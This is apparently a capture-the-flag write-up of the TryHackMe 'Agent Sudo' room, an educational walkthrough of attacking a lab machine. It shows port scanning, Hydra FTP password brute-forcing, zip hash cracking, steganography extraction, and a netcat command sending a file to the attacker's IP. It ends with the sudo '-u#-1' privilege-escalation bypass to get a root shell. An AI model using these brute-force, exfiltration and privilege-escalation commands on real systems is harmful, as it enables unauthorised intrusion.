# TryHackMe: Agent Sudo Writeup

[Play](https://tryhackme.com/room/agentsudoctf)

### 1. Enumeration & Exploration

### 1.1 Port Scanning

```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.170.197
Starting Nmap 7.91 (https://nmap.org ) at 2021-05-16 00:45 EDT
Nmap scan report for 10.10.170.197
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results athttps://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.16 seconds
```

```

```

None of the above stand out particularly, although we can try working on ftp first. Anonymous login is not allowed, else the scan would have returned it. We now try other routes.

### 1.2 Web Exploration

`http://10.10.170.197/index.php` is a valid page, meaning the website is built with php.

We also see this interesting thing here:

```
Dear agents,
Use your own codename as user-agent to access the site.
From,
Agent R
```

This is hinting us to change our user-agent, in the http requests to be R, which can be assumed to be the code-name. Fire up Burp Suite and intercept the request. Change it as such.

```
GET / HTTP/1.1
Host: 10.10.170.197
Upgrade-Insecure-Requests: 1
User-Agent: R
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

This is what we get as the response,

```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
Dear agents,
Use your own codename as user-agent to access the site.
From,
Agent R
```

This means our hypothesis was correct. We can now add the user-agent flag in the gobuster scan (above) and run it again. However … it looks we should try exploring more names. After looking at the hint, I got the extension for my browser and tried C.

```
Attention *****,
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
From,
Agent R
```

Ah so here we go!

### 1.3 Port: FTP Brute-force

We will now use Hydra to brute-force our way in, using the username we got.

```
┌──(kali㉿kali)-[~]
└─$ hydra -l {username} -P /usr/share/wordlists/rockyou.txt 10.10.170.197 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-16 01:22:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.170.197:21/
[STATUS] 224.00 tries/min, 224 tries in 00:01h, 14344175 to do in 1067:17h, 16 active
[21][ftp] host: 10.10.170.197   login: {username}   password: {password}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-16 01:23:37
```

Great! We can now log in ftp with the creds.

### 1.4 FTP: Exploration

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.170.197
Connected to 10.10.170.197.
220 (vsFTPd 3.0.3)
Name (10.10.170.197:kali): {username}
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
...
ftp> get cute-alien.jpg
...
ftp> get cutie.png
...
ftp>
221 Goodbye.
```

So the text file connects with what we saw earlier in the web exploration.

```
┌──(kali㉿kali)-[/tmp]
└─$ cat To_agentJ.txt
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
From,
Agent C
```

This clearly hints at some steganography.

### 1.5 Steganography

```
┌──(kali㉿kali)-[/tmp]
└─$ binwalk cutie.png
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

Clearly, we have something hidden. Use the `-e` flag to get the zip file. We have

```
┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip  To_agentR.txt
```

The To_agentR.txt file is empty, but we have another zip.

```
┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ 7z x 8702.zip
...

Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt

...
```

So we’ll need a password first. Brute forcing time again!

### 1.5 Zip: Brute-force

```
┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ /usr/sbin/zip2john 8702.zip > hash
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ john hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 44 candidates buffered for the current salt, minimum 48 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
{password}            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE 2/3 (2021-05-16 01:51) 1.538g/s 75606p/s 75606c/s 75606C/s 123456..pepper1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

This was completed fairly quickly. Extracting with the password, we get

```
┌──(kali㉿kali)-[/tmp/_cutie.png.extracted]
└─$ cat To_agentR.txt
Agent C,
We need to send the picture to {encrypted stego password was here ... } as soon as possible!
By,
Agent R
```

I thew this to [http://icyberchef.com/](http://icyberchef.com/) and we have the magic option. And … voila! We have the password

### 1.7 Steganography (Again)

Now we can simply extract the information

```
┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract -sf cute-alien.jpg
Enter passphrase:
wrote extracted data to "message.txt".
```

```
┌──(kali㉿kali)-[/tmp]
└─$ cat message.txt
Hi {agent J},
Glad you find this message. Your login password is {agent J's password}
Don't ask me why the password look cheesy, ask agent R who set this password for you.
Your buddy,
{agent C}
```

And we are done! This looks very much like a SSH password, let’s try logging in!

### 2. Foothold

For fun, I tried logging in with the agent C’s credentials in SSH, but to no avail. Back to agent J then!

```
┌──(kali㉿kali)-[/tmp]
└─$ ssh {agent J}@10.10.170.197
{agent J}@10.10.170.197's password:

...

Last login: Tue Oct 29 14:26:27 2019
{agent J}@agent-sudo:~$ ls -la
total 80
drwxr-xr-x 4 {agent J} {agent J}  4096 Oct 29  2019 .
drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
-rw-r--r-- 1 {agent J} {agent J} 42189 Jun 19  2019 Alien_autospy.jpg
-rw-r--r-- 1 {agent J} {agent J}    33 Oct 29  2019 user_flag.txt
```

Great! We have our user flag.

So they want us to solve another image related challenge … but before you pack your bags, its actually fun XD

Use netcat on your machine to listen to port 1337 and run the command `nc YOUR_IP 1337 < Alien_autospy.jpg` to send the file. Do not forget to put the output in a file like, `nc -lnvp 1337 > brr`. Now, as the hint suggests, do a Google reverse image search and look for the article by foxnews XD

### 3. Privilege Escalation

Okay. Time to get serious again.

```
{agent J}@agent-sudo:~$ sudo -l
Matching Defaults entries for {agent J} on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User {agent J} may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

So I googled the last line, and we get something interesting which we have seen before in other writeups as well. It is a security by pass exploit described here [https://www.exploit-db.com/exploits/47502.](https://www.exploit-db.com/exploits/47502.)

```
{agent J}@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Looks like we have some hope!

```
{agent J}@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~#
```

Ey, voila!

Overall a very fun room, lots of hash cracking and brute forcing — so that you can take a quick break while these tools go brrr 😛
